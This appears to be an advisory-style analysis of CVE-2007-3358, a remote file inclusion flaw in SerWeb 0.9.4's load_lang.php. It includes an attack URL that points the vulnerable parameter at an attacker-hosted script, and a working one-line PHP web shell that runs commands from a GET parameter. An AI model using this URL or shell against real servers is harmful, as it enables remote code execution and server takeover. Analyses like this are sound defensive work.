Based on the provided information, here's an analysis of CVE-2007-3358:

**Root Cause of Vulnerability:**
The root cause of the vulnerability is a Remote File Inclusion (RFI) weakness in the `load_lang.php` script of SerWeb version 0.9.4. The script includes a file specified through the `_SERWEB[serwebdir]` parameter without proper sanitization, allowing an attacker to include a remote file.

**Weaknesses/Vulnerabilities Present:**
- Remote File Inclusion (RFI): The `load_lang.php` script directly includes a file path from user-supplied input without proper sanitization.

**Impact of Exploitation:**
- Remote Code Execution (RCE): An attacker can include and execute arbitrary code from a remote server, potentially gaining full control over the vulnerable web server. This allows them to perform malicious actions such as data theft, system compromise, or denial of service.

**Attack Vectors:**
- HTTP GET request to the `load_lang.php` script, with a manipulated `_SERWEB[serwebdir]` parameter pointing to a malicious script hosted on an attacker-controlled server.
  ```
  http://site.com/[path]/load_lang.php?_SERWEB[serwebdir]=[Evil_Script]
  ```

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable web server.
- The attacker needs a publicly accessible server to host the malicious script that will be included and executed on the target server.

**Additional Details:**

- The exploit code provided uses `LWP::Simple` to send HTTP requests and execute commands on the target.
- The provided exploit includes a sample PHP shell script. This shell script, when included, allows the attacker to execute arbitrary commands on the server via the "cmd" GET parameter.
```php
<?php
ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>
```
- The exploit code allows the user to interact with the compromised server via a command prompt.
